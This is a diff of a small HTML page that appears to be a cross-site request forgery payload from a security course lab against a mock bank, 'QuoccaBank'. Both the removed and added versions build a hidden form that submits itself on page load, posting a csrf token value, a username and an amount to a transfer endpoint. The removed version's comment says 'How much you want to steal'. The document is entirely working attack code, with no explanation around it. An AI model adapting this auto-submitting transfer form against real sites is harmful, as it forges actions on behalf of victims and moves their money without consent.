@@ -1,16 +1,10 @@
-<!DOCTYPE html>
-<html lang="en">
-<head><meta charset="utf-8"><title>free money</title></head>
-<body onload="document.forms[0].submit()">
-  <!-- Change this if QuoccaBank uses a different sub-domain -->
-  <form action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
-    <!-- Change csrf token value -->
-    <input type="hidden" name="csrf_token" value="Mjc3MQ==">
-    <!-- YOUR QuoccaBank username here -->
-    <input type="hidden" name="username" value="z5431910">
-    <!-- How much you want to steal -->
-    <input type="hidden" name="amount"   value="100">
-  </form>
-  <p>If you see this text, auto-submit failed – try clicking the big empty space.</p>
-</body>
+
+<html>
+  <body onload="document.forms[0].submit()">
+    <form method="POST" action="https://phish-me.quoccacorp.com/api/transfer">
+      <input type="hidden" name="username" value="z5431910">
+      <input type="hidden" name="amount" value="100">
+      <input type="hidden" name="csrf_token" value="Mjc3MQ=="> 
+    </form>
+  </body>
 </html>
